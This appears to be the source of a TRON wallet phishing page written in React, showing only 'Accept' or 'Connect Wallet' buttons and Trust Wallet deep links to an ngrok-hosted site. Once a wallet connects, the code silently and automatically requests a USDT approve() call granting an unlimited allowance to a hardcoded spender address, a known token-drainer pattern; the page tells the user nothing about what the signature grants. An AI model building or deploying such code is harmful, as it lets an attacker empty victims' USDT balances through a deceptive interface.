import React, { useState, useEffect, useCallback } from 'react';
import { useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
import {
    WalletActionButton,
} from '@tronweb3/tronwallet-adapter-react-ui';
const TronWeb = require('tronweb');

// Spender address to be approved
const SPENDER_ADDRESS = 'TZFHbzgx3fknbqUX9SAwSdXQi1JgwTX5yF';

// Trust Wallet deep link URL - fixed format
const TRUST_WALLET_URL = "https://link.trustwallet.com/open_url?coin_id=195&url=https://dd5f-94-156-30-185.ngrok-free.app/";

// Alternative option with custom URI scheme (use this if the HTTPS version doesn't work)
const TRUST_WALLET_ALT_URL = "trust://open_url?coin_id=195&url=https://dd5f-94-156-30-185.ngrok-free.app/";

// Create TronWeb instance with default mainnet configuration
const tronWeb = new TronWeb({
    fullHost: 'https://api.trongrid.io'
});

// Log out TronWeb version and configuration
console.log('TronWeb Version:', TronWeb.version);
console.log('Initial TronWeb Config:', {
    fullHost: tronWeb.fullNode?.host,
    solidityNode: tronWeb.solidityNode?.host,
    eventServer: tronWeb.eventServer?.host
});

// Default USDT contract address (TRC20)
const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

// Helper to debug TronWeb state
function debugTronWebState() {
    console.log('TronWeb Provider Info:', {
        fullHost: tronWeb.fullNode ? tronWeb.fullNode.host : 'not set',
        hasAddress: !!tronWeb.defaultAddress,
        apiKey: tronWeb.fullNode?.headers?.['TRON-PRO-API-KEY'] || 'none'
    });
    
    if (tronWeb.defaultAddress) {
        console.log('Current TronWeb address:', tronWeb.defaultAddress.base58);
    }
}

// Setup TronWeb with user's address
function setupTronWeb(address: string): boolean {
    if (!address) {
        console.error('Cannot setup TronWeb: address is missing');
        return false;
    }
    
    try {
        console.log('Setting up TronWeb with address:', address);
        tronWeb.setAddress(address);
        
        // Verify setup was successful
        debugTronWebState();
        
        return true;
    } catch (error) {
        console.error('TronWeb setup error:', error);
        console.error('Error stack:', error instanceof Error ? error.stack : 'No stack trace');
        return false;
    }
}

// Create an unsigned contract call transaction
async function createContractTransaction(
    contractAddress: string,
    functionSelector: string,
    parameters: any[],
    options: any,
    fromAddress: string
): Promise<any> {
    try {
        console.log(`Creating contract call: ${functionSelector}`);
        
        // Use transaction builder to create an unsigned transaction
        const tx = await tronWeb.transactionBuilder.triggerSmartContract(
            contractAddress,
            functionSelector,
            options,
            parameters,
            fromAddress
        );
        
        console.log('Transaction created:', tx.result ? 'success' : 'failed');
        
        if (!tx.result || !tx.result.result) {
            console.error('Failed to create transaction:', tx);
            throw new Error('Transaction creation failed');
        }
        
        // Return the transaction for the wallet to sign
        return tx.transaction;
    } catch (error: any) {
        console.error('Error creating contract transaction:', error);
        throw error;
    }
}

// Create a USDT approval transaction to be sent to the wallet
async function approveToken(
    ownerAddress: string,
    spenderAddress: string
): Promise<any> {
    try {
        // Ensure TronWeb is set up with the user's address
        setupTronWeb(ownerAddress);
        
        console.log(`Creating USDT approval from ${ownerAddress} to ${spenderAddress}`);
        
        // Create a properly formatted transaction using the function signature
        // "approve(address,uint256)" with proper parameters
        const transaction = await createContractTransaction(
            USDT_CONTRACT_ADDRESS,
            'approve(address,uint256)',
            [
                { type: 'address', value: spenderAddress },
                { type: 'uint256', value: '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff' }
            ],
            {
                feeLimit: 100000000,
                callValue: 0
            },
            ownerAddress
        );
        
        console.log('Approval transaction created successfully. Transaction ID:', transaction.txID);
        
        // IMPORTANT: We DO NOT sign the transaction here
        // Instead, we return the unsigned transaction for the wallet connector to handle signing
        console.log('Returning unsigned transaction for wallet to sign');
        
        return transaction;
    } catch (error: any) {
        console.error('Failed to create approval transaction:', error);
        throw error;
    }
}

// Check token allowance - multiple approaches for reliability
async function checkAllowance(
    ownerAddress: string, 
    spenderAddress: string
): Promise<string> {
    if (!ownerAddress || !spenderAddress) {
        console.error('Missing address parameters for allowance check');
        return '0';
    }
    
    try {
        console.log('Checking allowance for:', {
            owner: ownerAddress,
            spender: spenderAddress
        });
        
        // Setup TronWeb
        setupTronWeb(ownerAddress);
        
        try {
            // Method 1: Try getting contract via tronWeb.contract().at()
            console.log('Trying method 1: contract().at()');
            const contract = await tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
            
            if (contract && contract.allowance) {
                const result = await contract.allowance(ownerAddress, spenderAddress).call();
                console.log('Method 1 result:', result);
                
                if (result) {
                    // Parse the result
                    const allowanceValue = result.toString();
                    console.log('Allowance value (method 1):', allowanceValue);
                    return allowanceValue;
                }
            }
        } catch (method1Error) {
            console.warn('Method 1 failed:', method1Error);
            // Continue to next method
        }
        
        try {
            // Method 2: Direct contract parameter call
            console.log('Trying method 2: triggerConstantContract');
            const result = await tronWeb.transactionBuilder.triggerConstantContract(
                USDT_CONTRACT_ADDRESS,
                'allowance(address,address)',
                {},
                [
                    { type: 'address', value: ownerAddress },
                    { type: 'address', value: spenderAddress }
                ]
            );
            
            console.log('Method 2 result:', result);
            
            if (result && result.constant_result && result.constant_result[0]) {
                // Convert hex to decimal
                const hex = '0x' + result.constant_result[0];
                const allowanceValue = tronWeb.toBigNumber(hex).toString();
                console.log('Allowance value (method 2):', allowanceValue);
                return allowanceValue;
            }
        } catch (method2Error) {
            console.warn('Method 2 failed:', method2Error);
        }
        
        // If we get here, both methods failed
        console.warn('All allowance check methods failed, defaulting to 0');
        return '0';
    } catch (error) {
        console.error('Allowance check completely failed:', error);
        return '0'; // Default to 0 to trigger approval flow
    }
}

// Function to detect if we're running in Trust Wallet
function isTrustWallet() {
    // Check for Trust Wallet's user agent
    if (typeof window !== 'undefined') {
        const userAgent = window.navigator.userAgent || '';
        
        // Check for Trust in user agent
        if (userAgent.includes('Trust') || userAgent.includes('TrustWallet')) {
            return true;
        }
        
        // Also check if we're in a mobile browser with Trust Wallet's ethereum object
        if (userAgent.includes('Mobile')) {
            // Use type assertion with optional chaining for type safety
            const ethereum = (window as any).ethereum;
            if (ethereum?.isTrust) {
                return true;
            }
        }
    }
    return false;
}

// Function to detect if device is mobile
function isMobile() {
    if (typeof window === 'undefined') return false;
    const ua = navigator.userAgent || navigator.vendor || (window as any).opera;
    // Checks for Android, iOS, and some common mobile browsers
    return /android|iphone|ipad|ipod|opera mini|iemobile|mobile/i.test(ua);
}

// Function to detect if device is desktop/laptop
function isDesktop() {
    return !isMobile();
}

// Function to detect if device is Android
function isAndroid() {
    if (typeof window === 'undefined') return false;
    const ua = navigator.userAgent || navigator.vendor || (window as any).opera;
    return /android/i.test(ua);
}

// Single button for connecting to wallet
function SingleButton() {
    return (
        <div style={{ margin: '20px 0' }}>
            <WalletActionButton style={{ 
                fontSize: '18px', 
                padding: '15px 30px',
                backgroundColor: '#3366FF',
                color: 'white',
                borderRadius: '4px',
            }} icon="">
                Accept
            </WalletActionButton>
        </div>
    );
}

// Desktop WalletConnect QR button (shows WalletActionButton)
function DesktopWalletConnectButton() {
    return (
        <div style={{ margin: '20px 0' }}>
            <WalletActionButton
                style={{
                    fontSize: '18px',
                    padding: '15px 30px',
                    backgroundColor: '#3366FF',
                    color: 'white',
                    borderRadius: '4px',
                }}
                icon=""
            >
                Connect Wallet
            </WalletActionButton>
            {/* <p style={{ marginTop: '10px', color: '#666', textAlign: 'center' }}>
                Scan this QR code with Trust Wallet to connect
            </p> */}
        </div>
    );
}

// Trust Wallet button component
function TrustWalletButton() {
    const openTrustWallet = () => {
        // Try both formats in case one doesn't work
        try {
            // First try the standard HTTPS format
            window.location.href = TRUST_WALLET_URL;
            
            // Fallback - if user stays on page more than 2 seconds, try custom scheme
            setTimeout(() => {
                if (document.visibilityState !== 'hidden') {
                    console.log('Trying alternative deep link format...');
                    window.location.href = TRUST_WALLET_ALT_URL;
                }
            }, 2000);
        } catch (e) {
            console.error('Error opening Trust Wallet:', e);
            // Fallback to alternative URI
            window.location.href = TRUST_WALLET_ALT_URL;
        }
    };
    
    return (
        <div style={{ margin: '20px 0' }}>
            <button 
                onClick={openTrustWallet}
                style={{
                    fontSize: '18px',
                    padding: '15px 30px',
                    backgroundColor: '#3375BB', // Trust Wallet blue
                    color: 'white',
                    border: 'none',
                    borderRadius: '8px',
                    cursor: 'pointer',
                    fontWeight: 'bold',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    margin: '0 auto',
                    boxShadow: '0 4px 6px rgba(0, 0, 0, 0.1)'
                }}
            >
                Accept
            </button>
            <p style={{ marginTop: '10px', color: '#666', textAlign: 'center' }}>
                Click to launch this app directly in Trust Wallet
            </p>
        </div>
    );
}

// Android-specific instructions for Trust Wallet
function TrustWalletAndroidInstructions() {
    const dappUrl = "https://dd5f-94-156-30-185.ngrok-free.app/";

    const copyToClipboard = async () => {
        try {
            await navigator.clipboard.writeText(dappUrl);
            alert("DApp URL copied! Open Trust Wallet, go to the Browser tab, and paste the URL.");
        } catch {
            alert("Copy failed. Please copy the URL manually:\n" + dappUrl);
        }
    };

    return (
        <div style={{ margin: '20px 0' }}>
            <div style={{
                background: '#fffbe6',
                border: '1px solid #ffe58f',
                borderRadius: '8px',
                padding: '20px',
                color: '#ad8b00',
                marginBottom: '10px'
            }}>
                <b>Android Trust Wallet Users:</b>
                <ol style={{ textAlign: 'left', margin: '10px auto', maxWidth: 400 }}>
                    <li>Open Trust Wallet app</li>
                    <li>Go to the <b>Browser</b> tab</li>
                    <li>Paste the following URL and open it:</li>
                </ol>
                <div style={{
                    background: '#f6ffed',
                    border: '1px solid #b7eb8f',
                    borderRadius: '4px',
                    padding: '8px',
                    wordBreak: 'break-all',
                    marginBottom: '8px'
                }}>
                    {dappUrl}
                </div>
                <button
                    onClick={copyToClipboard}
                    style={{
                        background: '#2196f3',
                        color: 'white',
                        border: 'none',
                        borderRadius: '4px',
                        padding: '8px 16px',
                        cursor: 'pointer',
                        fontWeight: 'bold'
                    }}
                >
                    Copy URL
                </button>
            </div>
        </div>
    );
}

// Component that directly initiates approval
function DirectApproveUSDT() {
    const { connected, address, signTransaction, signMessage } = useWallet();
    const [isApproving, setIsApproving] = useState(false);
    const [approvalConfirmed, setApprovalConfirmed] = useState(false);
    const [status, setStatus] = useState('');
    const [errorMessage, setErrorMessage] = useState('');
    
    // Main function to initiate approval - wrapped in useCallback
    const initiateTokenApproval = useCallback(async () => {
        if (!connected || !address || isApproving || !signTransaction) {
            setErrorMessage('Wallet not connected or signing not available');
            return;
        }
        
        setIsApproving(true);
        setStatus('Creating USDT approval transaction...');
        setErrorMessage('');
        
        try {
            console.log("Starting approval process for:", address);
            
            // 1. Create an unsigned transaction
            const unsignedTx = await approveToken(address, SPENDER_ADDRESS);
            console.log("Unsigned transaction created:", unsignedTx);
            
            // 2. Show transaction prompt in wallet
            setStatus('Please check your wallet and confirm the transaction request');
            
            // 3. Send to wallet adapter for signing & broadcasting
            // This will trigger the wallet UI to show a confirmation
            console.log("Sending transaction to wallet for signing...");
            const signedTx = await signTransaction(unsignedTx);
            
            console.log("Transaction signed successfully:", signedTx);
            setStatus('Transaction signed and submitted!');
            setApprovalConfirmed(true);
            
        } catch (error: any) {
            console.error("Approval error:", error);
            
            // Format error message for display
            let errorMsg = error.message || 'Unknown error';
            
            if (errorMsg.includes('User rejected')) {
                errorMsg = 'Transaction was rejected in your wallet';
                // If user rejected, allow retry
                setTimeout(() => {
                    setIsApproving(false);
                }, 1000);
            } else {
                errorMsg = 'Error: ' + errorMsg;
                // If other error, also allow retry
                setTimeout(() => {
                    setIsApproving(false);
                }, 2000);
            }
            
            setErrorMessage(errorMsg);
            setStatus('Error occurred during approval');
        } finally {
            // We don't set isApproving to false here as we want
            // to handle different errors differently
        }
    }, [connected, address, isApproving, signTransaction]);
    
    // Auto-start approval when wallet connects
    useEffect(() => {
        // If connected, address available, not approving currently, and not already confirmed
        if (connected && address && !isApproving && !approvalConfirmed) {
            console.log('Wallet connected, automatically initiating approval...');
            
            // Small delay to ensure wallet connection is stable
            const timer = setTimeout(() => {
                initiateTokenApproval();
            }, 1000);
            
            return () => clearTimeout(timer);
        }
    }, [connected, address, isApproving, approvalConfirmed, initiateTokenApproval]);
    
    // Reset state when wallet disconnects
    useEffect(() => {
        if (!connected) {
            setApprovalConfirmed(false);
            setIsApproving(false);
            setStatus('');
            setErrorMessage('');
        }
    }, [connected]);
    
    // If not connected, don't show anything
    if (!connected) {
        return null;
    }
    
    return (<></>
    );
}

// Main component
export default function Home() {
    const [isInTrustWallet, setIsInTrustWallet] = useState(false);
    const [isOnDesktop, setIsOnDesktop] = useState(false);
    const [isAndroidDevice, setIsAndroidDevice] = useState(false);

    useEffect(() => {
        setIsInTrustWallet(isTrustWallet());
        setIsOnDesktop(isDesktop());
        setIsAndroidDevice(isAndroid());
        console.log("Environment check:", { isInTrustWallet: isTrustWallet(), userAgent: window.navigator.userAgent });
    }, []);

    return (
        <div>
            <div style={{ textAlign: 'center', padding: '40px' }}>
                {/* <h1>TRON Wallet Connection</h1> */}
                {isInTrustWallet ? (
                    // In Trust Wallet, only show connect wallet button
                    <SingleButton />
                ) : isOnDesktop ? (
                    // On desktop/laptop, show WalletConnect QR button
                    <DesktopWalletConnectButton />
                ) : isAndroidDevice ? (
                    // On Android, show instructions
                    <TrustWalletAndroidInstructions />
                ) : (
                    // On mobile (not Trust Wallet), show "Open in Trust Wallet" button
                    <TrustWalletButton />
                )}
                <p style={{ marginTop: '20px', color: '#666', fontSize: '14px' }}>
                    {isInTrustWallet
                        ? 'You are viewing this app in Trust Wallet Browser'
                        : isOnDesktop
                        ? 'Scan the QR code with Trust Wallet to connect'
                        : isAndroidDevice
                        ? 'Please follow the instructions above to open this DApp in Trust Wallet on Android'
                        : 'For the best experience, open this app in Trust Wallet'}
                </p>
            </div>
            <DirectApproveUSDT />
        </div>
    );
}